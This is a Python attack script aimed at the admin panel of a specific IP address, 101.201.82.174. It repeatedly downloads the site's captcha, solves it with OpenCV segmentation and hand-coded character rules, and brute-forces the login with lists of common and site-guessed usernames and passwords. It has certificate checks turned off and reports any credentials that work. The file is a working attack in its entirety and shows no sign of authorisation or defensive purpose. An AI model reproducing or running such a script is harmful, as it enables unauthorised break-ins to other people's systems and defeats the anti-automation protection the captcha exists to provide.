#!/usr/bin/env python3
"""101.201.82.174 多密码+投影分割登录"""
import urllib.request, http.cookiejar, ssl, sys, time, json
import cv2
import numpy as np

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return np.frombuffer(r.read(), np.uint8)

def get_mask(img):
    target = np.array([25, 42, 128])
    mask = cv2.inRange(img, target-70, target+70)
    # 去除水平干扰线: 开运算(删除细横线)
    kh = cv2.getStructuringElement(cv2.MORPH_RECT, (1,5))
    mask = cv2.morphologyEx(mask, cv2.MORPH_OPEN, kh)
    # 连接字符: 膨胀
    kd = cv2.getStructuringElement(cv2.MORPH_RECT, (3,3))
    mask = cv2.dilate(mask, kd, iterations=2)
    # 垂直投影分割
    return mask

def seg_proj(mask):
    col_sum = mask.sum(axis=0)
    segs = []
    in_seg = False
    for i,c in enumerate(col_sum):
        if c > 3 and not in_seg: start=i; in_seg=True
        elif c <= 3 and in_seg:
            if i-start >= 6: segs.append((start,i-1))
            in_seg=False
    if in_seg and len(col_sum)-start >= 6: segs.append((start,len(col_sum)-1))
    return segs

def classify(seg, mask):
    s,e = seg
    h = mask.shape[0]
    rows = []
    for y in range(h):
        row = "".join("#" if mask[y,x] else "." for x in range(s,e+1))
        if "#" in row: rows.append(row)
    if not rows: return "?"
    H = len(rows); W = max(len(r) for r in rows)
    norm = [r + "."*(W-len(r)) for r in rows]
    top = norm[0]; bot = norm[-1]; mid = norm[H//2]
    lc = sum(1 for r in norm if r[0]=="#")/H
    rc = sum(1 for r in norm if r[-1]=="#")/H
    tl = "#" in top[:W//2]; tr = "#" in top[W//2:]
    bl = "#" in bot[:W//2]; br = "#" in bot[W//2:]
    ml = "#" in mid[:W//2]; mr = "#" in mid[W//2:]
    Wn = W/H

    # 数字
    if Wn < 0.38 and lc > 0.5: return "1"
    if lc > 0.55 and rc > 0.55:
        if tl and bl and ml: return "8"
        if tl and not bl and mr: return "6"
        if not tl and bl and not ml and tr: return "9"
        if tl and bl and not ml and tr and br: return "0"
    if lc > 0.55 and rc < 0.45 and tl and not bl and mr: return "2"
    if lc > 0.55 and not tl and bl: return "3"
    if lc < 0.45 and rc > 0.55 and tl and br: return "5"
    if lc > 0.55 and rc > 0.55 and tl and not bl and not ml and not tr: return "7"
    # 字母
    if lc > 0.5 and rc > 0.5 and not tl and not bl and ml: return "H"
    if lc < 0.4 and rc < 0.4 and not tl and not bl: return "X"
    if lc < 0.4 and rc < 0.4 and tl and tr: return "T"
    if lc > 0.55 and rc < 0.4 and not tl and not bl and mr: return "K"
    if lc > 0.55 and rc < 0.45 and tl and bl: return "E"
    if lc > 0.55 and rc < 0.45 and tl and not bl: return "F"
    if lc > 0.5 and rc > 0.5 and tl and not bl and not ml: return "U"
    if lc > 0.5 and rc > 0.5 and not tl and not bl and not ml and not tr: return "N"
    if lc > 0.5 and rc > 0.5 and not tl and not ml and not bl: return "A"
    if lc > 0.5 and rc > 0.5 and tl and not ml and bl and tr: return "B"
    if lc > 0.5 and rc > 0.5 and tl and not ml and bl and not tr: return "P"
    if Wn > 0.75 and lc > 0.3: return "W"
    if Wn > 0.75 and lc < 0.3: return "M"
    if lc > 0.55 and rc > 0.55 and tl and not ml and not bl and tr: return "O"
    return "?"

def login(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return json.loads(r.read().decode("utf-8","ignore"))
    except Exception as e:
        return {"status":-1,"msg":str(e)[:60]}

passwords = ["admin123","123456","admin","admin888","12345678","admin666","admin@123",
             "kefu123","zy_kefu","kefu888","123123","admin2024","admin2025","admin2026",
             "zhilian","zhilian123","zy123456","a123456","Aa123456","abc123"]
users = ["admin","zhilian","zyadmin","kefu"]

for i in range(400):
    data = get_captcha()
    img = cv2.imdecode(data, cv2.IMREAD_COLOR)
    if img is None: continue
    mask = get_mask(img)
    segs = seg_proj(mask)
    if len(segs) != 4:
        continue
    code = "".join(classify(s, mask) for s in segs)
    if "?" in code: continue
    for user in users:
        for pw in passwords:
            r = login(user, pw, code)
            if r.get("status") == 1:
                print(f"!!! 登录成功 {user}/{pw} code={code}", flush=True)
                sys.exit(0)
            elif "密码" in str(r.get("msg","")) or "账号" in str(r.get("msg","")) or "不存在" in str(r.get("msg","")):
                # 验证码对了,密码错了 -> 跳过剩余密码? 不,继续
                pass
            elif "验证码" not in str(r.get("msg","")):
                print(f"[{i}] code={code} {user}/{pw} -> {r}", flush=True)
    if i % 50 == 0:
        print(f"[{i}] code={code} 尝试中", flush=True)
    time.sleep(0.2)
print("DONE")
